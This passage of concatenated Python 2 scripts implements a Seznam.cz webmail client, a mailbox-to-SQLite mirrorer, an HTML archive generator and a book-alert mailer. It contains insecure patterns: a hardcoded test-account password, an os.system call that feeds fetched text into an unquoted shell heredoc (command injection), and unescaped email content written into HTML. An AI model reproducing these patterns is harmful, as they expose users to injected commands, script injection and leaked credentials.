		if value.getTagName() == "i4" or value.getTagName() == "int":
			return int(value.getContent())
		elif value.getTagName() == "double":
			return float(value.getContent())
		elif value.getTagName() == "boolean":
			return value.getContent().strip() == "1"
		elif value.getTagName() == "string":
			return value.getContent()
		elif value.getTagName().startswith("datetime"):
			return value.getContent()
		elif value.getTagName() == "struct":
			return _XMLRPC2dict(value)
		elif value.getTagName() == "array":
			value = value.find("data")
			if len(value) == 0:
				return []
			else:
				value = value[0]
				out = []
				for v in value.childs:
					if str(v).strip() != 0:
						if len(v.childs) > 0:
							out.append(processValue(getNonblank(v.childs)[0]))
				return out
		else:
			return "unimplemented: " + str(value)

	# check if input was parsed - if not, parse it
	if type(xml) == str:
		xml = d.parseString(xml)

	out = {}
	xml = xml.find("struct")[0]
	for member in xml.find("member"):
		name  = member.find("name")[0].getContent()
		value = member.find("value")[0]

		# filter only nonblank childs
		value.childs = getNonblank(value.childs)

		if len(value.childs) == 0:    # blank values
			value = None
		elif len(value.childs) == 1:  # most of values should fall there
			value = processValue(value.childs[0])
		else:                         # and this shouldn't happen at all
			new_val = []
			for v in value.childs:
				new_val.append(processValue(v))
			value = new_val

		out[name] = value

	return out


def _keyOrElse(dictionary, key, or_else):
	"""
	Return value from dictionary[key] if key is in |dictionary|, else
	|or_else|.
	"""
	return dictionary[key] if key in dictionary else or_else



#= Classes ====================================================================
class Attachment:
	def __init__(self, message_ref, name, mhash, mimetype, size):
		self.message_ref = message_ref
		self.name        = name
		self.hash        = mhash
		self.mimetype    = mimetype
		self.size        = size

	def getContent(self):
		return downer.download(FILE_URL + self.hash)

	def save(self, path = "", filename = ""):
		if filename == "":
			filename = self.name

		f = open(path + filename, "wb")
		f.write(self.getContent())
		f.close()

		return path + filename

	def __str__(self):
		return self.name + " : " + self.mimetype + " (" + str(self.size) + "b) "

	def getFilename(self):
		return self.name

	def getMimeType(self):
		return self.mimetype

	def getSize(self):
		return self.size

	def getHash(self):
		return self.hash

	def getMessageReference(self):
		return self.message_ref



class Message:
	def __init__(self, email, uid, mid, from_addr, to_addr, subject,
		         message_hash, date, unread):
		# check from_addr - you wouldn't believe what you can have there..
		if type(from_addr) == str:
			from_addr = {"email": str(from_addr), "name": ""}
		elif type(from_addr) in [list, tuple] and len(from_addr) >= 1:
			from_addr = from_addr[0]
		else:
			from_addr = {"email": str(from_addr), "name": ""}

		self.attachments = []
		self.from_addr = from_addr
		self.to_addr   = to_addr if len(to_addr) >= 1 else [{"email": email, "name": ""}]
		self.subject   = subject
		self.timestamp      = time.strptime(date.split("+")[0], "%Y%m%dT%H:%M:%S")
		self.timestamp      = int(time.mktime(self.timestamp))

		self.uid       = uid
		self.mid       = mid
		self.hash      = message_hash
		self.unread    = unread

	def getContent(self):
		data = downer.download(RPC_URL, post = """
			<methodCall>
				<methodName>user.message.getAttributes</methodName>
				<params>
					<param>
						<value><int>""" + str(self.uid) + """</int></value>
						<value><int>""" + str(self.mid) + """</int></value>
					</param>
				</params>
			</methodCall>
		""")

		return _XMLRPC2dict(data)["body"]

	def getHeaders(self):
		return downer.download(HEADERS_URL + self.hash)

	def getAttachments(self):
		return self.attachments

	def remoteSetUnread(self, status):
		unread = 1 if status else 0

		data = downer.download(RPC_URL, post = """
			<methodCall>
				<methodName>user.message.flags.set</methodName>
				<params>
					<param>
						<value><int>""" + str(self.uid) + """</int></value>
						<value><int>""" + str(self.mid) + """</int></value>
						<value><string>unread</string></value>
						<value><boolean>""" + str(unread) + """</boolean></value>
					</param>
				</params>
			</methodCall>
		""")

		data = _XMLRPC2dict(data)
		if data["status"] != 200:
			raise InterfaceException(
				"Can't set message " +
				str(self.mid) +
				" to unread state: " +
				data["statusMessage"]
			)

		self.unread = status

	def __str__(self):
		date = str(self.timestamp)
		return self.from_addr["email"] + " (" + date + "): " + self.subject

	def _serializeContact(self, contact, template = '"$name" <$email>'):
		return Template(template).substitute(
			name = _keyOrElse(contact, "name", ""),
			email = _keyOrElse(contact, "email", ""),
		)

	def getFrom(self):
		return self.from_addr

	def getTo(self):
		return self.to_addr

	def getSubject(self):
		return self.subject

	def getTimestamp(self):
		return self.timestamp

	def getMailID(self):
		return self.mid

	def getHash(self):
		return self.hash

	def getUnread(self):
		return self.unread



class Directory:
	def __init__(self, email, uid, name, did, count):
		self.email = email
		self.uid    = uid
		self.name   = name
		self.id     = did
		self.count  = count

	def getMessages(self):
		"Return list of Message objects."

		data = downer.download(RPC_URL, post = """
			<methodCall>
				<methodName>user.listMessages</methodName>
				<params>
					<param>
						<value><int>""" + str(self.uid) + """</int></value>
						<value><string>label-id:""" + str(self.id) + """</string></value>
					</param>
				</params>
			</methodCall>
		""")

		out = []
		for message in _XMLRPC2dict(data)["messages"]:
			m = Message(
				self.email,
				self.uid,
				message["id"],
				_keyOrElse(message, "from", ""),
				_keyOrElse(message, "to", ""),
				_keyOrElse(message, "subject", ""),
				message["hash"],
				message["date"],
				message["unread"]
			)

			# check if threre are attachments to message
			if "attachments" in message and len(message["attachments"]) > 0:
				for atmnt in message["attachments"]:
					m.attachments.append(
						Attachment(
							m,                                         # message reference
							_keyOrElse(atmnt, "filename", "blank"),
							atmnt["hash"],
							atmnt["mtype"],
							atmnt["size"],
						)
					)

			out.append(m)

		return out

	def __str__(self):
		return self.name + "(id: " + str(self.id) + ", count: " + str(self.count) + ")"

	def getName(self):
		return self.name

	def getID(self):
		return self.id



class MailBoxAPI:
	def __init__(self, email, password):
		"""
		Raise:
		  InvalidDomainException: If bad email domain is used.
		"""
		self.email    = email.strip()
		self.password = password
		self.username = None
		self.domain   = None
		self.uid      = None
		self.hashID   = None

		self.username, self.domain = self.__getUsernameDomain(self.email)


	def __getUsernameDomain(self, email):
		"Parse username and domain from email. Check if domain is allowed."

		if "@" not in email:
			raise InvalidDomainException("No domain detected in '" + str(email) + "'!")

		username, domain = email.lower().split("@")

		if domain not in ALLOWED_DOMAINS:
			raise InvalidDomainException("Invalid domain '" + str(domain) + "'!")

		return username, domain


	def login(self):
		"""
		Log into given email account.

		Raise:
			BadLoginException: ..
		"""
		# get initial cookies
		downer.download("http://seznam.cz")
		downer.headers["Referer"] = "http://seznam.cz"
		downer.disable_redirect = True

		downer.download(
			"https://login.szn.cz/loginProcess",
			post = {
				"serviceId": "email",
				"loggedURL": "https://email.seznam.cz",
				"username": self.username,
				"domain": self.domain,
				"password": self.password,
				"forceSSL": "1",
				"js": "1"
			}
		)

		try:
			downer.download(downer.response_headers["location"])
		except KeyError:
			raise BadLoginException("Bad username or password!")

		# cookie dance
		downer.cookies["email.seznam.cz"] = {}
		downer.cookies["email.seznam.cz"].update(downer.cookies["seznam.cz"])
		downer.cookies["email.seznam.cz"].update(downer.cookies["login.szn.cz"])
		downer.cookies["email.seznam.cz"].update(downer.cookies["login.seznam.cz"])
		downer.headers["Referer"] = "https://login.seznam.cz/loginService"
		downer.download("https://email.seznam.cz/")

		# get hashid
		downer.headers["Referer"] = "https://email.seznam.cz"
		data = downer.download("https://email.seznam.cz/index.js")

		if data.strip() == "":
			raise BadLoginException("This login doesn't work!")

		# parse hashID
		data = data.splitlines()
		self.hashID = filter(lambda x: "WM.CONF.hashId" in x, data)[0]
		self.hashID = self.hashID.split("=")[1].split('"')[1]

		# parse userID (used in RPC calls)
		self.uid = filter(lambda x: "WM.CONF.uid =" in x, data)[0]
		self.uid = self.uid.split("=")[1].strip().replace(";", "")

		# set connection variables
		downer.headers["X-Seznam-hashId"] = self.hashID
		downer.headers["Content-Type"]    = "text/xml"


		# check if successfully logged in
		data = downer.download(RPC_URL, post = """
			<methodCall>
				<methodName>user.listLabels</methodName>
				<params>
					<param>
						<value><int>""" + str(self.uid) + """</int></value>
					</param>
				</params>
			</methodCall>
		""")

		data = _XMLRPC2dict(data)

		if data["status"] != 200:
			__message = _keyOrElse(data, "statusMessage", "")

			raise BadLoginException(
				"Received status code " +
				str(data["status"]) + ": " + str(__message)
			)


	def getDirectoryList(self):
		"""
		Returns list of Directory objects with both system and user defined
		directories in email account.
		"""

		# xml-rpc call for list of all directiories
		data = downer.download(RPC_URL, post = """
		<methodCall>
			<methodName>user.listLabels</methodName>
			<params>
				<param>
					<value><int>""" + str(self.uid) + """</int></value>
				</param>
			</params>
		</methodCall>
		""")

		out = []
		cnt = 0
		for struct in d.parseString(data).find("struct"):
			# skip first element
			if cnt == 0:
				cnt += 1
				continue

			# convert to dictionary
			directory_data = _XMLRPC2dict(struct)

			if "name" in directory_data:
				out.append(
					Directory(
						self.email,
						self.uid,
						directory_data["name"],
						directory_data["id"],
						_keyOrElse(directory_data, "count", 0)
					)
				)

			cnt += 1

		return out

	def getDirectories(self):
		"""
		Return associative array with dirname:Directory.

		Difference between getDirectoryList() and getDirectories() is that if
		user define folder with system name, it will shadow system directory in
		dictionary, so sometimes is better to use getDirectoryList().
		"""

		out = {}
		for i in self.getDirectoryList():
			out[i.getName()] = i

		return out

	def getEmail(self):
		return self.email

	def getUsername(self):
		return self.username

	def getDomain(self):
		return self.domain

	def getUID(self):
		return self.uid



#= Main program ================================================================
if __name__ == '__main__':
	print __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"
	print
	print "Unittesting .. "


	# test domain parsing
	try:
		mb = MailBoxAPI("a", "xe")
		raise AssertionError("Mailbox is not checking domain!")
	except InvalidDomainException:
		pass

	# try login into some random account
	mb = MailBoxAPI("a@seznam.cz", "somethingrandom")
	try:
		mb.login()
		raise AssertionError("Mailbox is not checking password - wtf?")
	except BadLoginException:
		pass

	# try login into valid account
	mb = MailBoxAPI("python.unittest@seznam.cz", "unittestunittest")
	try:
		mb.login()
	except:
		raise AssertionError('Mail account is no longer accessible.')

	dirs = mb.getDirectories()

	assert len(dirs) == len(mb.getDirectoryList())

	messages = dirs["inbox"].getMessages()

	first  = filter(lambda x: "First" in x.getSubject(), messages)[0]
	second = filter(lambda x: "Second" in x.getSubject(), messages)[0]

	assert first.getUnread() is False
	assert second.getUnread() is True

	assert first.getContent().strip()  == "Hello, this is first message."
	assert second.getContent().strip() == "Second message - with attachment"

	assert second.getAttachments()[0].getFilename() == "ssmtp.r"

	print "All tests passed."
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "Seznam.cz account mirrorer"
__version = "1.1.3"
__date    = "25.09.2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports =====================================================================
import sys
import time
import urllib2
import hashlib
import getpass
import argparse

import sqlite3

# own
import seznamcz2
from mfn import IPtools



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"



def createOrOpenDatabase(filename):
	# connect database
	db = sqlite3.connect(filename)
	db.text_factory = sqlite3.OptimizedUnicode
	db.text_factory = str

	# try create tables (success only if not created from previous session)
	db.executescript(
		"""
		CREATE TABLE IF NOT EXISTS MailBox(
			address   VARCHAR(500),
			timestamp INTEGER
		);
		CREATE TABLE IF NOT EXISTS Directories(
			did  INTEGER PRIMARY KEY AUTOINCREMENT,
			name TEXT,
			
			UNIQUE (did, name)
		);
		CREATE TABLE IF NOT EXISTS Messages(
			mid        VARCHAR(50) PRIMARY KEY,
			timestamp  INTEGER,
			timeofdown INTEGER,
			subject    TEXT,
			content    TEXT,
			headers    TEXT
		);
		CREATE TABLE IF NOT EXISTS Contacts(
			email VARCHAR(500) PRIMARY KEY,
			name  VARCHAR(500)
		);
		CREATE TABLE IF NOT EXISTS Files(
			hash     VARCHAR(32) PRIMARY KEY,
			size     INTEGER,
			mimetype VARCHAR(20),
			content  BLOB
		);

		CREATE TABLE IF NOT EXISTS hasMessage(
			mid,
			did,

			FOREIGN KEY(did) REFERENCES Directories(did),
			FOREIGN KEY(mid) REFERENCES Messages(mid)

			PRIMARY KEY(did, mid)
		);
		CREATE TABLE IF NOT EXISTS hasFrom(
			mid,
			email,

			FOREIGN KEY(mid)   REFERENCES Messages(mid),
			FOREIGN KEY(email) REFERENCES Contacts(email),

			PRIMARY KEY(mid, email)
		);
		CREATE TABLE IF NOT EXISTS hasTo(
			mid,
			email,

			FOREIGN KEY(mid)   REFERENCES Messages(mid),
			FOREIGN KEY(email) REFERENCES Contacts(email),

			PRIMARY KEY(mid, email)
		);
		CREATE TABLE IF NOT EXISTS hasFile(
			mid,
			file_hash,

			FOREIGN KEY(mid) REFERENCES Messages(mid),
			FOREIGN KEY(file_hash) REFERENCES Files(hash),

			PRIMARY KEY(mid, file_hash)
		);
		CREATE TABLE IF NOT EXISTS hasFilename(
			mid,
			file_hash,
			filename TEXT,

			FOREIGN KEY(mid)  REFERENCES Messages(mid),
			FOREIGN KEY(file_hash)  REFERENCES Files(hash),
			
			PRIMARY KEY(mid, file_hash, filename)
		);
		""")
	db.commit()

	return db


def saveMessage(db, message, dirname, cnt):
	db_cur = db.cursor()

	# generate unique mail id
	MID_SIZE = 50
	mid = str(message.getMailID()) + "_" + str(message.getTimestamp())
	mid = mid[:MID_SIZE] if len(mid) > MID_SIZE else mid # MID_SIZE chars max

	# get subject and short subject
	SUBJ_SIZE     = 40
	subject       = message.getSubject()
	short_subject = subject[:SUBJ_SIZE] + ".." if len(subject) > SUBJ_SIZE else subject

	write("\t" + str(cnt) + "\t" + short_subject + " .. ")

	# dont process already processed messages
	db_cur.execute("SELECT COUNT(mid) FROM Messages WHERE mid = ?", [mid])
	if db_cur.fetchone()[0] < 1:
		try:
			headers = message.getHeaders()
		except urllib2.HTTPError:
			headers = "Cannot download headers!"
			write(headers)

		db_cur.execute(
			"INSERT INTO Messages(mid, timestamp, subject, content, headers, timeofdown) VALUES(?, ?, ?, ?, ?, ?)",
			(
				mid,
				int(message.getTimestamp()),
				message.getSubject(),
				message.getContent(),
				headers,
				int(time.time())
			)
		)

		# put message into directory
		db_cur.execute(
			"INSERT INTO hasMessage(mid, did) VALUES(?, (SELECT did FROM Directories WHERE name = ?))",
			(
				mid,
				dirname
			)
		)

		# process contacts
		for contact in [message.getFrom()] + message.getTo():
			db_cur.execute(
				"INSERT OR IGNORE INTO Contacts(email, name) VALUES(?, ?)",
				(
					contact["email"],
					contact["name"] if "name" in contact else "",
				)
			)

		# join "from" contact with message
		db_cur.execute(
			"INSERT OR IGNORE INTO hasFrom(mid, email) VALUES(?, ?)",
			(
				mid,
				message.getFrom()["email"],
			)
		)

		# joind "to" contacts with message
		for contact in message.getTo():
			db_cur.execute(
				"INSERT OR IGNORE INTO hasTo(mid, email) VALUES(?, ?)",
				(
					mid,
					contact["email"],
				)
			)

		writeln("done")
	else:
		writeln("already processed")


	# skip messages which have already downloaded attachments
	db_cur.execute("SELECT COUNT(mid) FROM hasFile WHERE mid = ?", [mid])
	if db_cur.fetchone()[0] == len(message.getAttachments()) and len(message.getAttachments()) > 0:
		writeln("\t\tAttachments already processed.")
		db.commit()
		return


	# process attachments
	for attachment in message.getAttachments():
		FN_SIZE = 20
		fn = attachment.getFilename()
		fn = fn[FN_SIZE] + ".." if len(fn) > FN_SIZE else fn

		write("\t\t" + fn + " (" + seznamcz2.sizeofFmt(attachment.getSize()) + ") .. ")
		
		# download data
		try:
			content = attachment.getContent()
		except urllib2.HTTPError:
			content = "This file cannot be downloaded."
			write(content)

		# count hash
		file_hash = hashlib.md5(content).hexdigest()

		# insert file into database
		db_cur.execute(
			"INSERT OR IGNORE INTO Files(hash, size, mimetype, content) VALUES(?, ?, ?, ?)",
			(
				file_hash,
				attachment.getSize(),
				attachment.getMimeType(),
				content
			)
		)

		# connect file with message
		db_cur.execute(
			"INSERT OR IGNORE INTO hasFile VALUES(?, ?)",
			(
				mid,
				file_hash
			)
		)

		# connect filename with file and message
		db_cur.execute(
			"INSERT OR IGNORE INTO hasFilename VALUES(?, ?, ?)",
			(
				mid,
				file_hash,
				attachment.getFilename()
			)
		)

		writeln("done")

	db.commit()



#= Main program ================================================================
if __name__ == '__main__':
	# Parse arguments
	parser = argparse.ArgumentParser(
		description = "Seznam.cz email account mirrorer. This program downloads everything in users mailbox."
	)

	# Required arguments
	parser.add_argument(
		"-p",
		"--proxy",
		metavar = "hostname:port",
		action  = "store",
		type    = str,
		help    = "SOCKS5 proxy adress."
	)

	# Optional arguments
	parser.add_argument(
		"-d",
		"--directory",
		action = "store",
		type   = str,
		help   = "Backup only messages in given directory."
	)
	parser.add_argument(
		"-s",
		"--start",
		action = "store", 
		type   = int,
		help   = "Start from message (integer)."
	)
	parser.add_argument(
		"-n",
		"--no-proxy",
		action  = "store_true", 
		default = False,
		help    = "Do not use proxy."
	)
	parser.add_argument(
		"-l",
		"--password",
		action = "store", 
		type   = str,
		help   = "Password parameter. If set, program doesn't ask for password."
	)
	parser.add_argument(
		"-f",
		"--file",
		metavar = "filename",
		action  = "store",
		default = "",
		type    = str,
		help    = "Specify sqlite database. Default account_at_somewheredd.mm.yy.sqlite."
	)

	# Positional
	parser.add_argument("email", help = "User's email address.")

	args = parser.parse_args()



	# validation of email address
	if "@" not in args.email:
		writeln("'" + args.email + "' isn't valid email address!", sys.stderr)
		sys.exit(1)

	# check if mailbox is hosted by seznam.cz
	domain = args.email.split("@")[-1].lower()
	if domain not in seznamcz2.ALLOWED_DOMAINS:
		writeln("'" + args.email + "' isn't mailbox provided by http://seznam.cz!", sys.stderr)
		sys.exit(1)


	# get password
	password = args.password
	if password == None:
		password = getpass.getpass("Password: ")


	# install proxy
	if args.proxy != None:
		if ":" not in args.proxy:
			sys.stderr.write("You have to specify port in proxy settings!\n")
			sys.exit()
		
		p_tmp = args.proxy.split(":")
		port = 0
		hostname = ""
		try:
			hostname = p_tmp[0]
			port = int(p_tmp[1])
		except Exception, e:
			sys.stderr.write(str(e) + "\n")
			sys.exit(1)
		
		IPtools.installProxy(hostname, port)
	elif args.no_proxy != True:
		sys.stderr.write("You have to use a proxy!\n")
		sys.exit(1)



	#= Main program ============================================================
	mb = seznamcz2.MailBoxAPI(args.email, password)


	# Login to the mailbox
	write("Logging in as '" + args.email + "'.. ")
	try:
		mb.login()
		writeln("ok")
	except seznamcz2.BadLoginException, e:
		writeln("failed: " + e.value)
		sys.exit(1)


	# Get list of directories
	write("\nRetrieving list of directories .. ")
	dirs = mb.getDirectoryList()
	writeln("got " + str(len(dirs)) + " (" + ", ".join(map(lambda x: x.getName(), dirs)) + ")\n")


	if args.directory != None and args.directory not in map(lambda x: x.getName(), dirs):
		writeln("There is no directory named '" + args.directory + "'!", sys.stderr)
		sys.exit(1)


	# Create/Open database object
	db_fn = mb.getEmail().replace("@", "_at_")
	db_fn = db_fn + "_" + time.strftime("%d.%m.%y", time.gmtime()) + ".sqlite"
	if args.file != None and args.file.strip() != "":
		db_fn = args.file
	db    = createOrOpenDatabase(db_fn)


	for directory in dirs:
		dirname = directory.getName()

		if args.directory != None and args.directory != dirname:
			continue

		write("\n" + dirname)

		# read messages from given directory
		messages = directory.getMessages()

		writeln(" (" + str(len(messages)) + "):")

		# create directory in database
		db.execute(
			"INSERT INTO Directories(name) VALUES(?)",
			(dirname,)
		)
		db.commit()

		# skip empty directories
		if len(messages) == 0:
			print "\tEmpty"
			continue

		# download messages and save them into database
		cnt = 0
		for message in messages:
			if args.start != None and cnt < args.start:
				cnt += 1
				continue

			saveMessage(db, message, dirname, cnt)
			cnt += 1


	# save current date, mailbox address and flush database to disk
	db.execute("INSERT INTO MailBox VALUES(?, ?)", (mb.getEmail(), int(time.time())))
	db.commit()

	writeln("\n\nDone. All messages saved in '" + db_fn + "'.")#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = "HTML generator."
__version = "1.0.1"
__date    = "01.08.2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports =====================================================================
import os
import os.path
import sys
import time
import random
import sqlite3
import argparse
from string import Template


import seznamcz2



#= Variables ===================================================================
MSG_TEMPLATE = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<head>
	<title>$short_subject</title>
	
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>

<style>
body {
	display: block;
	margin: 0 auto;
	width: 800px;
	padding: 10px;
}

h1 {
	text-align:center;
}
</style>

<body>
<div>
<h1>$short_subject</h1>

<p>
<table>
	<tr><td><strong>From</strong>:</td> <td>$from_addr</td></tr>
	<tr><td><strong>To</strong>:</td> <td>$to</td></tr>
	<tr><td><strong>Date</strong>:</td> <td>$date</td></tr>
	<tr><td><strong>Saved</strong>:</td> <td>$saved</td></tr>
	<tr><td><strong>Subject</strong>:</td> <td>$subject</td></tr>
</table>
</p>

<h2>Body</h2>
<p>$content</p>

<hr>

<h2>Attachments</h2>
<p>
	<table>
	$attachments
	</table>
</p>

<hr>
<h2>Headers</h2>
<pre>$headers</pre>
</div>
</body>
</HTML>"""

DIRECTORY_INDEX_TEMPLATE = """
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<head>
	<title>$dirname</title>
	
	<link rel="stylesheet" type="text/css" href="./style.css">
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>

<style>
body {
	display: block;
	margin: 0 auto;
	width: 800px;
	padding: 10px;
}

h1 {
	text-align:center;
}

table {
	border: 1px solid black;
	width: 100%;
	text-align: left;
}
</style>

<body>
<div>
<h1>$dirname</h1>

<table>
$records
</table>
</div>
</body>
</HTML>
"""



#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def createDirIfNotExists(dirname):
	if not os.path.exists(dirname):
		os.mkdir(dirname)

	return dirname


def timestampToDate(timestamp):
	return time.strftime("%d.%m.%Y %H:%M:%S", time.localtime(int(timestamp)))


def processContacts(db, tablename, mid):
	db_cur = db.cursor()
	db_cur.execute(
		"""
		SELECT email, name FROM Contacts WHERE
			email = (SELECT email FROM """ + tablename + """ WHERE mid = ?)
		""",
		[mid]
	)
	contactlist = []
	for email, name in db_cur.fetchall():
		if name != "":
			contactlist.append('"' + name + '" &lt;' + email + "&gt;")
		else:
			contactlist.append(email)

	return ", ".join(contactlist)


def countAttachments(db, mid):
	db_cur = db.cursor()
	db_cur.execute("SELECT COUNT(file_hash) FROM hasFile WHERE mid = ?", [mid])

	return db_cur.fetchone()[0]


def processAttachments(db, path, mid):
	if countAttachments(db, mid) < 1:
		return ""

	db_cur = db.cursor()
	out = ""
	attachment_template = Template(
		"""
	<tr>
		<td><a href="./$unique_fn">$filename</a></td>
		<td>$mimetype</td>
		<td>($size)</td>
	</tr>"""
	)

	db_cur.execute(
		"""
		SELECT
			hasFilename.filename, Files.size, Files.mimetype, Files.content
		FROM
			Files
		JOIN
			hasFilename ON
				hasFilename.file_hash = Files.hash
			AND
				hasFilename.mid = ?
		WHERE
			Files.hash IN (SELECT file_hash FROM hasFile WHERE mid = ?)
		ORDER BY
			hasFilename.filename
		""",
		[mid, mid]
	)
	for filename, size, mimetype, content in db_cur.fetchall():
		size = seznamcz2.sizeofFmt(size)

		# make sure filenames are unique
		unique_fn = filename
		file_path = path + "/" + filename
		while os.path.exists(file_path) or file_path == "index.html":
			unique_fn = str(random.randint(0, 99999999)) + filename
			file_path = path + "/" + unique_fn

		writeln("\t\t" + filename + " (" + size + ")")

		file = open(file_path, "w")
		file.write(content)
		file.close()

		out += attachment_template.substitute(
			filename  = filename,
			unique_fn = unique_fn,
			mimetype  = mimetype,
			size      = size
		)

	return out


def saveMessage(db, path, mid):
	db_cur = db.cursor()

	if countAttachments(db, mid) > 0:
		path = createDirIfNotExists(path + "/" + mid)
	message_fn = path + "/" + mid + ".html"

	db_cur.execute(
		"""
		SELECT timestamp, timeofdown, subject, content, headers FROM Messages WHERE
			mid = ?
		""",
		[mid]
	)
	timestamp, saved_timestamp, subject, content, headers = db_cur.fetchone()

	# get subject and short subject
	SUBJ_SIZE     = 40
	short_subject = subject[:SUBJ_SIZE] + ".." if len(subject) > SUBJ_SIZE else subject

	html_msg = Template(MSG_TEMPLATE).substitute(
		to        = processContacts(db, "hasTo", mid),
		date      = timestampToDate(timestamp),
		saved     = timestampToDate(saved_timestamp),
		subject   = subject if subject.strip() != "" else "No subject",
		content   = content.replace("\n", "<br />") if "<br" not in content else content,
		headers   = headers,
		from_addr = processContacts(db, "hasFrom", mid),
		short_subject = short_subject,
		attachments   = processAttachments(db, path, mid),
	)

	file = open(message_fn, "w")
	file.write(html_msg)
	file.close()

	return message_fn, short_subject, timestampToDate(timestamp), countAttachments(db, mid)



def saveMessages(db, path, did):
	db_cur = db.cursor()
	out = ""
	link_template = Template(
		"""
	<tr>
		<td>$date</td>
		<td><a href="./$filename">$subject</a></td>
		<td>Attachments: $attachments</td>
	</tr>"""
	)

	dirname = db_cur.execute(
		"SELECT name from Directories WHERE did = ?",
		[did]
	).fetchone()[0]

	writeln("Saving messages from " + dirname + ":")

	db_cur.execute(
		"""
		SELECT
			mid
		FROM
			Messages
		WHERE
			mid IN (SELECT mid FROM hasMessage WHERE did = ?)
		ORDER BY
			Messages.timestamp DESC
		""",
		[did]
	)
	for mid in db_cur.fetchall():
		mid = mid[0]

		message_path, short_subject, date, att_count = saveMessage(db, path, mid)

		writeln("\t" + short_subject)

		message_path = message_path.replace(os.path.commonprefix([path, message_path]), "")
		out += link_template.substitute(
			date        = date,
			subject     = short_subject,
			filename    = message_path,
			attachments = att_count
		)

	writeln("")

	return Template(DIRECTORY_INDEX_TEMPLATE).substitute(
		dirname = dirname,
		records = out
	)



#= Main program ================================================================
if __name__ == '__main__':
	# Parse arguments
	parser = argparse.ArgumentParser(
		description = "Seznam.cz HTMLgenerator. This script generates HTML from previously saved data into sqlite databases.."
	)

	# Positional
	parser.add_argument("filename", help = "Location of sqlite database with saved data.")

	args = parser.parse_args()


	# check if file really exists
	if not os.path.exists(args.filename):
		writeln("File '" + args.filename + "' doesn't exists!", sys.stderr)
		sys.exit(1)


	# connect database
	db = sqlite3.connect(args.filename)
	db.text_factory = sqlite3.OptimizedUnicode
	db.text_factory = str
	
	db_cur = db.cursor()

	# try read sample data to test that given file is really sqlite database
	try:
		db_cur.execute("SELECT address FROM MailBox")
	except sqlite3.DatabaseError:
		writeln("Can't connect database. Is it really sqlite3 file?", sys.stderr)
		sys.exit(1)


	# create directory which will contain all data
	email     = db_cur.fetchall()[0][0]
	base_path = createDirIfNotExists(email.replace("@", "_at_"))

	# process 
	db_cur.execute(
		"""
		SELECT did, name FROM Directories WHERE
			did IN (
				SELECT did FROM hasMessage
			)
		"""
	)
	for did, directory_name in db_cur.fetchall():
		box_path = createDirIfNotExists(base_path + "/" + directory_name)

		# write directory index
		file = open(box_path + "/index.html", "w")
		file.write(saveMessages(db, box_path, did))
		file.close()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import os
import shelve
import os.path
import commands

import dhtmlparser as d



#= Configuration ===============================================================
checkers_dir = "checkers"
do_want      = ["hack", "crack"]


MAILER    = "mailer"
MAIL_FROM = "hlubina@internetu.net"
MAIL_TO   = "bystrousak@kitakitsune.org"



#= Global variables ============================================================
# load saved data
db = shelve.open("save.dat")
if db.has_key("ignore_list"):
	ignore_list = db["ignore_list"]
else:
	ignore_list = []



#= Functions & objects =========================================================
def getCheckers():
	output = []
	for c in os.listdir(checkers_dir):
		fn = checkers_dir + "/" + c
		if os.access(fn, os.X_OK) and not os.path.isdir(fn):
			output.append(fn)
	
	return output



#= Main program ================================================================
# get data from checkers
books = open("books.txt").read()#""
for c in getCheckers():
	print "running", c
	books += commands.getoutput("./" + c)

print "Searching wanted stuff.."

# check names and description for wanted strings
interesting_books = []
dom = d.parseString(books)
for book in dom.find("book"):
	def getParamFromXml(xml, param):
		par = xml.find(param)
		if isinstance(par, list) and len(par) >= 1:
			return par[0].getContent().strip().lower()
		else:
			return "Unknown " + str(param)
	
	name = getParamFromXml(book, "name")
		
	# skip ignored (checked) books 
	if name in ignore_list:
		continue
	
	descr = book.find("descr")[0].getContent().lower()
	
	for want in do_want:
		want = want.lower()
		if want in descr or want in name:
			interesting_books.append({ # transform xml to python dictionary
				"name"        : name, 
				"author"      : getParamFromXml(book, "author"),
				"url"         : getParamFromXml(book, "url"),
				"description" : descr, 
				"cost"        : getParamFromXml(book, "cost")
			})
			break
		
	ignore_list.append(name)


#= Payload goes here ===========================================================
mail = "New books:\n\n"
for i in interesting_books:
	print "\t", i["name"]
	
	mail += str("Name:\t" + i["name"] + "\n" +
		"Author:\t" + i["author"] + "\n" +
		"URL:\t" + i["url"] + "\n" +
		"Description:\n\n" + i["description"] + "\n\n" +
		i["url"] + "\n\n" +
		"---\n\n")

if len(interesting_books) > 0:
	print "Sending mail.."
	mail = os.system(MAILER + " -f " + MAIL_FROM + " -t " + MAIL_TO + " -s 'New books' <<ASOIDJAOISFAFGASHOD\n" + mail + "\nASOIDJAOISFAFGASHOD\n")
	
	if mail == 0:
		print "Sent"
	else:
		print "Do you have my mailer installed?"

